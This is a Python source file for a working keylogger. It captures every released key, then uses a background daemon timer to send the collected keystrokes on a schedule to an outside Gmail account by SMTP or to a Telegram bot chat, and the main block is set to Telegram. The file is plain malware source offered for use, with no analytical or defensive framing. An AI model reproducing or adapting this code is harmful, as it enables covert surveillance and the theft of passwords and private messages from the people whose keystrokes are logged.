import smtplib
import datetime
from threading import Timer
from config import (SEND_REPORT_EVERY, TELEGRAM_BOT_TOKEN, EMAIL,
                    PASSWORD, ADMIN_CHAT_ID)
try:
    import keyboard
    import requests
    from contracts import contract, new_contract
except ModuleNotFoundError:
    from subprocess import call
    call(f"pip install requests keyboard PyContracts", shell=True)


@new_contract
def validationCheckReportMethod(x):
    if x not in ("email", "file", "telegram"):
        raise ValueError(f"report_method can only be one of these three:"
                         "email, telegram, file. Unacceptable %s" % x)


class Keylogger:
    @contract
    def __init__(self, interval=3600, report_method="file"):
        """
        :param interval: Time interval between sending reports (in seconds).
            Default - 3600 seconds (1 hour).
        :param report_method: Method of sending reports. Default - "file"
            Three methods supported:
                1. "file" - reports are saved to a file locally.
                2. "telegram" - reports are sent via bot to telegram.
                3. "email" - reports are sent to email.

        :attr log: all pressed keys are recorded here.
        :attr heading_log: report title. Includes the date and time the
            report was sent. What it looks like: Keylogger
                                                 Date: DAYS/MONTHS/YEARS
                                                 Time: HOURS/MINUTES/SECONDS
                                                 ===========================
                                                 self.log content
        :type interval: int,>0
        :type report_method: str,validationCheckReportMethod
        """
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.heading_log = datetime.datetime.now().strftime(
            "Keylogger\nDate: %d/%m/%Y\nTime: %H:%M:%S\n===================\n"
        )

    @contract
    def report_to_email(self, email, password, text):
        """This method sends report to email.

        For the method to work, you need to configure the server and port
        of the email to which you want to send reports. Default - gmail.

        :param email: full name of the email, including login, @ and domain
        :param password: email password
        :param text: report text

        :type email: str
        :type password: str
        :type text: str
        """
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, text)
        server.quit()

    @contract
    def report_to_telegram(self, bot_token, chat_id, text):
        """This method sends report to telegram.

        For this method to work, you need a telegram bot. You can create
        it in the bot @BotFather. Ibid you can also find out the token of the
        bot you created there. Next, you need to find out your ID so that the
        bot can send a message to you. This can be done in the bot @username_to_id_bot.

        :param bot_token: your bot token (get it in @BotFather)
        :param chat_id: actually your ID (get it in @username_to_id_bot)
        :param text: report text

        :type bot_token: str
        :type chat_id: str
        :type text: str
        """
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        request = requests.post(url, data={"chat_id": chat_id, "text": text})
        if request.status_code != 200:
            request.raise_for_status()

    @contract
    def report_to_file(self, text):
        """This method sends report to file.

        Everytime datetime.datetime.now() generates a new name for the file.
        File name example: Report from 2021-11-18 02:25:27.048190

        :param text: report text
        :type text: str
        """
        with open(f"Report from {datetime.datetime.now()}", "w") as file:
            print(text, file=file)

    def callback(self, event):
        """This callback is called every time a key is pressed."""
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = " [ENTER]\n"
            else:
                name = f"[{name.upper()}]".replace(" ", "_")
        self.log += name

    def report(self):
        """This method handles sending reports.

        It also creates a new thread_daemon that runs in the background.
        This thread_daemon is responsible for sending reports after a certain
        period of time (interval).
        """
        if self.log:
            if self.report_method == "email":
                self.report_to_email(EMAIL, PASSWORD,
                                     self.heading_log + self.log)
            elif self.report_method == "telegram":
                self.report_to_telegram(TELEGRAM_BOT_TOKEN, ADMIN_CHAT_ID,
                                        self.heading_log + self.log)
            elif self.report_method == "file":
                self.report_to_file(self.heading_log + self.log)
        self.log = ""
        thread_daemon = Timer(interval=self.interval, function=self.report)
        thread_daemon.daemon = True
        thread_daemon.start()

    def start(self):
        """This method runs keylogger.

        keyboard module documentation: https://github.com/boppreh/keyboard
        """
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(SEND_REPORT_EVERY, "telegram")
    keylogger.start()
